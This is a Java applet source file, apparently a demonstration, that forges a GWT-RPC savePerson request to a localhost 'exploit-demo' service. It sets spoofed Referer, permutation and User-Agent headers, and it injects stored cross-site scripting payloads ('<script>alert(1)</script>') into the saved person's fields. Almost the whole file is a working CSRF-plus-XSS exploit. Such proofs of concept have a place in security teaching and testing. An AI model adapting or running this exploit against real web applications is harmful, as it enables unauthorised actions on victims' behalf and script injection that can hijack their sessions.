import java.applet.Applet;
import java.awt.TextArea;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLConnection;


public class XsrfApplet extends Applet{
	private final TextArea outputArea = new TextArea(60,40);
	public void init(){
		add(outputArea);
		try {
			URL url = new URL("http://localhost:8080/exploit-demo/exploitdemo/person-service");
			String data = "7|0|7|http://localhost:8080/exploit-demo/exploitdemo/|1B90092C2EC4DF33929AE5AEAD84B809|jan.edu.ed.client.services.PersonService|savePerson|jan.edu.ed.shared.model.Person/1822325774|<script type='text/javascript'>alert(1);</script>|<script type='text/javascript'>alert(1);</script>|1|2|3|4|1|5|5|6|7|";
			URLConnection conn = url.openConnection();
			conn.setRequestProperty("X-GWT-Permutation", "EE265A9A7408B59C6DC058D094A30585");
			conn.setRequestProperty("X-GWT-Module-Base", "http://localhost:8080/exploit-demo/exploitdemo/");
			conn.setRequestProperty("Referer", "http://localhost:8080/exploit-demo/");
			conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0.1) Gecko/20100101 Firefox/5.0.1");
			conn.setRequestProperty("Content-Type", "text/x-gwt-rpc; charset=utf-8");
			
			conn.setDoOutput(true);
		    OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
		    wr.write(data);
		    wr.flush();
		    BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
		    String line;
		    while ((line = rd.readLine()) != null) {
		        outputArea.append(line);
		    	System.out.println(line);
		    
		    }
		    wr.close();
		    rd.close();
		    
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	public static void main(String [] args){
		new XsrfApplet().init();
	}
}
